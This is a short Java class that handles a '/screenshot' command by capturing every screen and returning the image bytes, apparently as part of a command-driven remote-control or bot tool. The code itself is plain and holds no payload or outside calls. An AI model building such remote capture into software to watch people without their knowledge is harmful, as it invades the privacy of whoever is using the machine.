package lk.tech.commands.impl;

import lk.tech.dto.Answer;
import lk.tech.services.ScreenCapture;

import java.util.List;

public class CommandScreenshot extends AbstractCommand {

    @Override
    public Answer run(String command) {
        try {
            List<byte[]> listBytes = ScreenCapture.captureAllScreens();
            return new Answer(command, listBytes);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public String condition() {
        return "/screenshot";
    }
}
